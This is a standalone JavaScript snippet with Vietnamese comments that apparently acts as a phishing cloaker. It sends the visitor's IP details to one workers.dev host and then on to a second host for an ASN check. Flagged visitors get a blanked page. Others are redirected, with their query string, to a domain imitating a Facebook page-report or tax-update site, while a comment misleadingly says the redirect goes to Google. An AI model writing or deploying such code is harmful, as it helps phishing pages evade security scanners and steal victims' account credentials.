// Gửi GET request đến endpoint đầu tiên
fetch('https://ipinfo-check.keafordfoucault.workers.dev/')
  .then(response => {
    if (!response.ok) {
      throw new Error(`Lỗi HTTP! Trạng thái: ${response.status}`);
    }
    return response.json();
  })
  .then(data => {
    // Gửi POST request đến endpoint thứ hai với dữ liệu nhận được
    return fetch('https://check-asn-ip.keafordfoucault.workers.dev/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    });
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`Lỗi HTTP! Trạng thái: ${response.status}`);
    }
    return response.json();
  })
  .then(responseData => {
    // Xử lý kết quả theo yêu cầu
    if (responseData.result === "KO") {
      // Xóa toàn bộ nội dung trang
      document.body.innerHTML = '';
    } else if (responseData.result === "OK") {
      // Lấy query string hiện tại
      const queryString = window.location.search;
      
      // Tạo URL chuyển hướng với query string
      const redirectUrl = new URL('https://tax-connecting-update-newkor.facebook-page-report.workers.dev/');
      redirectUrl.search = queryString;
      
      // Chuyển hướng đến Google với query string
      window.location.href = redirectUrl.href;
    }
  })
  .catch(error => {
    console.error('Có lỗi xảy ra:', error);
    if (document.body.innerHTML !== '') {
      alert('Có lỗi xảy ra: ' + error.message);
    }
  });